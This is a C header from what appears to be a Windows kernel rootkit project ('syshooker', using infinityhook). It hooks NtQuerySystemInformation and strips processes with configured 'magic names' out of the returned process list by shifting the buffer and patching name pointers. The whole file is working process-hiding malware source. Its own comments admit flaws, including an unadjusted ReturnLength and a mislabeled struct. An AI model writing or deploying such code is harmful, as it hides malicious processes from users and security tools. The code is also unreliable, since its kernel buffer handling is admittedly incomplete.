#pragma once
#include "Settings.h"

// macro source: https://stackoverflow.com/questions/3437404/min-and-max-in-c
#define MIN(a,b) (((a)<(b))?(a):(b))

// source: https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation
typedef struct _SYSTEM_PROCESS_INFORMATION {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    CHAR Reserved1[48]; // was BYTE Reserved1[48];
    UNICODE_STRING ImageName;
    KPRIORITY BasePriority;
    HANDLE UniqueProcessId;
    PVOID Reserved2;
    ULONG HandleCount;
    ULONG SessionId;
    PVOID Reserved3;
    SIZE_T PeakVirtualSize;
    SIZE_T VirtualSize;
    ULONG Reserved4;
    SIZE_T PeakWorkingSetSize;
    SIZE_T WorkingSetSize;
    PVOID Reserved5;
    SIZE_T QuotaPagedPoolUsage;
    PVOID Reserved6;
    SIZE_T QuotaNonPagedPoolUsage;
    SIZE_T PagefileUsage;
    SIZE_T PeakPagefileUsage;
    SIZE_T PrivatePageCount;
    LARGE_INTEGER Reserved7[6];
} SYSTEM_PROCESS_INFORMATION;

typedef struct _SYSTEM_THREAD_INFORMATION {
	LARGE_INTEGER Reserved1[3];
	ULONG Reserved2;
	PVOID StartAddress;
	CLIENT_ID ClientId;
	KPRIORITY Priority;
	LONG BasePriority;
	ULONG Reserved3;
	ULONG ThreadState;
	ULONG WaitReason;
} SYSTEM_THREAD_INFORMATION;

typedef NTSTATUS(*NtQuerySystemInformation_t)(
	_In_ SYSTEM_INFORMATION_CLASS SystemInformationClass,
	_Out_ PVOID SystemInformation,
	_In_ ULONG SystemInformationLength,
	_Out_opt_ PULONG ReturnLength
	);

static UNICODE_STRING StringNtQuerySystemInformation = RTL_CONSTANT_STRING(L"NtQuerySystemInformation");
static NtQuerySystemInformation_t OriginalNtQuerySystemInformation = NULL;

ULONG GetLastEntrySize(ULONG ReturnLength, SYSTEM_PROCESS_INFORMATION* CurrentEntry) {
	ULONG AllEntriesSum = 0;
	while (CurrentEntry->NextEntryOffset != 0) {
		AllEntriesSum += CurrentEntry->NextEntryOffset;
		CurrentEntry = (SYSTEM_PROCESS_INFORMATION*)((PUINT8)CurrentEntry + CurrentEntry->NextEntryOffset); // move forward
	}
	ULONG LastEntrySize = ReturnLength - AllEntriesSum;
	kprintf("[+] syshooker: AllEntriesSum %d, LastEntrySize %d\n", AllEntriesSum, LastEntrySize);
	return LastEntrySize;
}

void PrintProcessStructInfo(SYSTEM_PROCESS_INFORMATION* ProcessInformationPtr, ULONG BufferLeftOffset) {
	WCHAR ProcessNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
	const wchar_t* RealProcessNameBufferAddr;

	if (ProcessInformationPtr->NextEntryOffset > 0) // shift if not last process
		RealProcessNameBufferAddr = (wchar_t*)((PUINT8)(ProcessInformationPtr->ImageName.Buffer) - BufferLeftOffset); // shift value is in bytes, so we retype to PUINT8 to be able to do pointer arithmetic
	else
		RealProcessNameBufferAddr = ProcessInformationPtr->ImageName.Buffer;

	wcsncpy(ProcessNameBuffer, RealProcessNameBufferAddr, MIN(ProcessInformationPtr->ImageName.Length, MAX_PATH_SYSHOOKER - 1)); // -1 to ensure that the last char is \0
	kprintf("[+] syshooker: PrintProcessStructInfo (offset %d): Struct addr: %p, Process Name: %ws, Process Name buffer addr original: %p, shifted buffer: %p, NextEntryOffset: %d, threadcount: %d, thread struct size: %d\n", BufferLeftOffset, ProcessInformationPtr,  ProcessNameBuffer, ProcessInformationPtr->ImageName.Buffer, RealProcessNameBufferAddr, ProcessInformationPtr->NextEntryOffset, ProcessInformationPtr->NumberOfThreads, sizeof(SYSTEM_THREAD_INFORMATION));
}

void PrintAllProcessEntries(SYSTEM_PROCESS_INFORMATION* ProcessInformationPtr) {
	kprintf("[+] syshooker: printing ALL entries\n");
	while (ProcessInformationPtr->NextEntryOffset != 0) {
		ProcessInformationPtr = (SYSTEM_PROCESS_INFORMATION*)((PUINT8)ProcessInformationPtr + ProcessInformationPtr->NextEntryOffset); // move forward
		PrintProcessStructInfo(ProcessInformationPtr, 0);
	}
	kprintf("[+] syshooker: done with printing ALL entries\n");
}

void FixNameBuffers(SYSTEM_PROCESS_INFORMATION* ProcessInformationPtr, const ULONG LeftOffset) {
	kprintf("[+] syshooker: FixNameBuffers start, offset: %d...\n", LeftOffset);
	while (ProcessInformationPtr->NextEntryOffset != 0) { // last one will be skipped
		wchar_t* RealProcessNameBufferAddr = (wchar_t*)((PUINT8)(ProcessInformationPtr->ImageName.Buffer) - LeftOffset); // shift value is in bytes, so we retype to PUINT8 to be able to do pointer arithmetic

		// rewrite the ImageName.Buffer address
		ProcessInformationPtr->ImageName.Buffer = RealProcessNameBufferAddr;

		ProcessInformationPtr = (SYSTEM_PROCESS_INFORMATION*)((PUINT8)ProcessInformationPtr + ProcessInformationPtr->NextEntryOffset); // move forward
	}
	kprintf("[+] syshooker: FixNameBuffers done fixing addresses.\n");
}

NTSTATUS DetourNtQuerySystemInformation(
	_In_ SYSTEM_INFORMATION_CLASS SystemInformationClass,
	_Out_ PVOID SystemInformation,
	_In_ ULONG SystemInformationLength,
	_Out_opt_ PULONG ReturnLength)
{
	NTSTATUS OriginalStatus = OriginalNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
	
	if (NT_SUCCESS(OriginalStatus) && SystemInformationClass == SYSHOOKER_SYSTEM_INFORMATION_CLASS_PROCESS) {
		ULONG RemovedBytesOffset = 0;
		kprintf("[+] infinityhook: NtQuerySystemInformation: SystemInformationClass: %d, SystemInformationLength: %d, Buffer beginning addr: %p\n", SystemInformationClass, SystemInformationLength, SystemInformation);
		if (ReturnLength) {
			kprintf("[+] infinityhook: NtQuerySystemInformation: returnLength: %d\n", *ReturnLength);
		}
		else {
			kprintf("[-] infinityhook: NtQuerySystemInformation: returnLength is null: %p\n", ReturnLength);
		}

        SYSTEM_PROCESS_INFORMATION* ProcessInformationPtr = (SYSTEM_PROCESS_INFORMATION*)SystemInformation;
		SYSTEM_PROCESS_INFORMATION* PreviousProcessInformationPtr = (SYSTEM_PROCESS_INFORMATION*)SystemInformation;

        if (ProcessInformationPtr) {
			//PrintAllProcessEntries(ProcessInformationPtr);

            while (1) {
                //kprintf("[+] infinityhook: NtQuerySystemInformation: PID: %d\n", ProcessInformationPtr->UniqueProcessId);
				//PrintProcessStructInfo(ProcessInformationPtr, 0);
                WCHAR ProcessNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
                wcsncpy(ProcessNameBuffer, ProcessInformationPtr->ImageName.Buffer, MIN(ProcessInformationPtr->ImageName.Length, MAX_PATH_SYSHOOKER-1)); // -1 to ensure that the last char is \0

				//if (wcsstr(ProcessNameBuffer, Settings.NtQuerySystemInformationProcessMagicName)) {
					//kprintf("[+] infinityhook: NtQuerySystemInformation: Should hide: %ws\n", ProcessNameBuffer);
				//}

				// original check - uncomment to go back
				// if (wcsstr(ProcessNameBuffer, Settings.NtQuerySystemInformationProcessMagicName)) {
				if (matchMagicNames(ProcessNameBuffer, (Target)TARGET_PROCESS)) {
					kprintf("[+] infinityhook: NtQuerySystemInformation: Should hide: %ws\n", ProcessNameBuffer);
					// Not the last one
					if (ProcessInformationPtr->NextEntryOffset > 0) {

						// calculate how many bytes from the next record (current should be deleted) to the end of the buffer

						// Start at the next record - Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits);
						SYSTEM_PROCESS_INFORMATION* TempProcessInformationPtr = (SYSTEM_PROCESS_INFORMATION*)((PUINT8)ProcessInformationPtr + ProcessInformationPtr->NextEntryOffset);
						ULONG ProcessInformationBufferSizeToEnd = 0;
						while (TempProcessInformationPtr->NextEntryOffset != 0) {
							ProcessInformationBufferSizeToEnd += TempProcessInformationPtr->NextEntryOffset;
							TempProcessInformationPtr = (SYSTEM_PROCESS_INFORMATION*)((PUINT8)TempProcessInformationPtr + TempProcessInformationPtr->NextEntryOffset); // Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
						}
						// last record size
						//ProcessInformationBufferSizeToEnd += LastEntrySize; // TODO - do something smarter here
						ProcessInformationBufferSizeToEnd += sizeof(SYSTEM_PROCESS_INFORMATION); // after this there are n thread structs and process name itself

						// next structure address - start copying from there
						SYSTEM_PROCESS_INFORMATION* NextProcessInformationStructAddr = (SYSTEM_PROCESS_INFORMATION*)((PUINT8)ProcessInformationPtr + ProcessInformationPtr->NextEntryOffset);

						// remember how big is this struct that we are hiding so that we can fix name buffer addresses in the following entries
						ULONG RemovedStructSize = ProcessInformationPtr->NextEntryOffset;

						kprintf("[+] syshooker: memmove: dst %p, src %p, bytescount %d\n", ProcessInformationPtr, NextProcessInformationStructAddr, ProcessInformationBufferSizeToEnd);
						kprintf("[+] syshooker: before memmove\n");
						PrintProcessStructInfo(NextProcessInformationStructAddr, 0);


						// memmove memory and note that the buffer was 'shifted left' NextEntryOffset bytes
						RemovedBytesOffset += ProcessInformationPtr->NextEntryOffset;
						memmove(ProcessInformationPtr, NextProcessInformationStructAddr, ProcessInformationBufferSizeToEnd);

						kprintf("[+] syshooker: after memmove\n");
						PrintProcessStructInfo(ProcessInformationPtr, 0);

						// fix addresses from the current entry to the end
						FixNameBuffers(ProcessInformationPtr, RemovedStructSize);

						continue; // handle the same structure address next (because it was moved)
					}

					// Last one
					else {
						kprintf("[-] syshooker: do we ever hit this?");
						// set previous NextEntryOffset to 0
						PreviousProcessInformationPtr->NextEntryOffset = 0;

						// TODO - should not be FILE_DIRECTORY_INFORMATION here - fix!!!
						// length should be PROBABLY be sizeof(SYSTEM_PROCESS_INFORMATION) + NameLength * sizeof(wchar)
						// erease this FileInformation structure
						memset(ProcessInformationPtr, 0, sizeof(SYSTEM_PROCESS_INFORMATION));
						break;
					}
				}

                if (ProcessInformationPtr->NextEntryOffset == 0) break;
                ProcessInformationPtr = (SYSTEM_PROCESS_INFORMATION*)((PUINT8)ProcessInformationPtr + ProcessInformationPtr->NextEntryOffset); // Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
            }
        }
	}
	
	// TODO - decrease ReturnLength - we may have removed some data
	return OriginalStatus;
}